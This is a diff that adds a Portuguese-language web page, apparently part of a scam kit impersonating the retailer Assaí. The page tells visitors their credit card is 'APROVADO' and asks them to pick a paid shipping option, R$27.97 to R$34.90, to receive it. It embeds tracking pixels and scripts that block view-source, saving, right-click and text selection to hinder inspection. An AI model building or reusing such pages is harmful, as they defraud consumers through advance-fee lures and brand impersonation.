@@ -1,0 +1,324 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1289289589600537');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1289289589600537&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+   
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+
+    <meta charset="UTF-8">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Escolha o Método de Envio</title>
+    <style>
+        body {
+            background-color: #f9f9f9;
+            font-family: Arial, sans-serif;
+        }
+
+        .header {
+            background-color: #1E3A80;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            border-bottom: solid 3px  #ee4d2d;
+        }
+
+        .header img {
+            width: 120px;
+        }
+
+        .main-content {
+            max-width: 600px;
+            margin: 40px auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .main-content h5 {
+            font-weight: bold;
+            color: #1E3A80;
+            margin-bottom: 20px;
+        }
+
+        .opcao-card {
+            border: 2px solid #e6e6e6;
+            border-radius: 10px;
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items-center;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .opcao-card:hover {
+            border-color:  #1E3A80;
+            background-color: rgba(29, 78, 216, 0.05);
+        }
+
+        .opcao-card.selecionado {
+            border-color:  #1E3A80;
+            background-color: rgba(29, 78, 216, 0.1);
+        }
+
+        .opcao-card h6 {
+            margin: 0;
+            font-size: 16px;
+        }
+
+        .opcao-card small {
+            color: #666;
+        }
+
+        .opcao-card .preco {
+            font-weight: bold;
+            color: r #1E3A80;
+        }
+
+        .opcao-card .icon {
+            margin-right: 15px;
+            font-size: 24px;
+            color:  #1E3A80;
+        }
+
+        .btn-custom {
+            background-color:  #1E3A80;
+            color: white;
+            font-weight: bold;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 8px;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .btn-custom:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .btn-custom:hover:not(:disabled) {
+            background-color:  #1E3A80;
+        }
+
+        .footer {
+            background: #ffffff;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+            padding: 15px;
+            font-size: 10px;
+            color: #666;
+        }
+
+        .footer p {
+            margin: 0;
+            /* Remove espaçamento extra entre as linhas do rodapé */
+        }
+    </style>
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("keydown", bloquearSource);
+        } else { //Versões antigas do IE
+            document.attachEvent("onkeydown", bloquearSource);
+        }
+
+        function bloquearSource(e) {
+            e = e || window.event;
+
+            var code = e.which || e.keyCode;
+
+            if (
+                e.ctrlKey &&
+                (code == 83 || code == 85) //83 = S, 85 = U
+            ) {
+                if (e.preventDefault) {
+                    e.preventDefault();
+                } else {
+                    e.returnValue = false;
+                }
+
+                return false;
+            }
+        }
+    </script>
+    <style>
+        /*desabilita a seleção no body*/
+        body {
+            -webkit-touch-callout: none;
+            /* iOS Safari */
+            -webkit-user-select: none;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: none;
+            /* Konqueror */
+            -moz-user-select: none;
+            /* Firefox */
+            -ms-user-select: none;
+            /* Internet Explorer/Edge */
+            user-select: none;
+        }
+
+        /*habilita a seleção nos campos editaveis*/
+        input,
+        textarea {
+            -webkit-touch-callout: initial;
+            /* iOS Safari */
+            -webkit-user-select: text;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: text;
+            /* Konqueror */
+            -moz-user-select: text;
+            /* Firefox */
+            -ms-user-select: text;
+            /* Internet Explorer/Edge */
+            user-select: text;
+        }
+
+        /*habilita a seleção nos campos com o atributo contenteditable*/
+        [contenteditable=true] {
+            -webkit-touch-callout: initial;
+            /* iOS Safari */
+            -webkit-user-select: all;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: all;
+            /* Konqueror */
+            -moz-user-select: all;
+            /* Firefox */
+            -ms-user-select: all;
+            /* Internet Explorer/Edge */
+            user-select: all;
+        }
+    </style>
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("contextmenu", function (e) {
+                e.preventDefault();
+                return false;
+            });
+        } else { //Versões antigas do IE
+            document.attachEvent("oncontextmenu", function (e) {
+                e = e || window.event;
+                e.returnValue = false;
+                return false;
+            });
+        }
+
+</script>
+</head>
+<div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">
+    <div class="header">
+        <img src="images/logo.svg" alt="Logo">
+    </div>
+
+    <div class="main-content">
+        <h5>Escolha o metodo de envio</h5>
+        <p>Agora basta escolher uma forma de envio do seu Cartao de Credito <strong>APROVADO</strong></p>
+
+        <div id="opcoes-envio">
+            <!-- Opção EXPRESS -->
+            <div class="opcao-card" onclick="selecionarOpcao('sedex')">
+                <div class="d-flex align-items-center">
+                    <span class="icon">📦</span>
+                    <div>
+                        <h6>SEDEX</h6>
+                        <small>1 dia util</small>
+                    </div>
+                </div>
+                <div class="preco">R$ 34,90</div>
+            </div>
+
+            <!-- Opção SEDEX -->
+            <div class="opcao-card" onclick="selecionarOpcao('express')">
+                <div class="d-flex align-items-center">
+                    <span class="icon">🚚</span>
+                    <div>
+                        <h6>EXPRESS</h6>
+                        <small>5 dias uteis</small>
+                    </div>
+                </div>
+                <div class="preco">R$ 29,58</div>
+            </div>
+
+            <!-- Opção PAC -->
+            <div class="opcao-card" onclick="selecionarOpcao('pac')">
+                <div class="d-flex align-items-center">
+                    <span class="icon">📬</span>
+                    <div>
+                        <h6>PAC</h6>
+                        <small>10 dias uteis</small>
+                    </div>
+                </div>
+                <div class="preco">R$ 27,97</div>
+            </div>
+        </div>
+
+        <button id="continuarEnvio" class="btn-custom" disabled="">Continuar</button>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        Copyright © 2025 Assaí. Todos os direitos reservados.<br>
+
+        Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
+    </div>
+
+    <script>
+    let opcaoSelecionada = null;
+
+    function selecionarOpcao(opcao) {
+        opcaoSelecionada = opcao;
+
+    // Remove a classe 'selecionado' de todas as opções
+    document.querySelectorAll('.opcao-card').forEach(function(card) {
+        card.classList.remove('selecionado');
+            });
+
+    // Adiciona a classe 'selecionado' à opção clicada
+    document.querySelector(`.opcao-card[onclick="selecionarOpcao('${opcao}')"]`).classList.add('selecionado');
+
+    // Habilita o botão de continuar
+    document.getElementById('continuarEnvio').disabled = false;
+        }
+
+    document.getElementById('continuarEnvio').addEventListener('click', function() {
+            if (opcaoSelecionada) {
+        localStorage.setItem('freteOpcao', opcaoSelecionada);
+    localStorage.setItem('type', opcaoSelecionada);
+    window.location.href = `/${opcaoSelecionada}` + '?' + new URLSearchParams(window.location.search);
+            }
+        });
+    </script>
+
+</html>
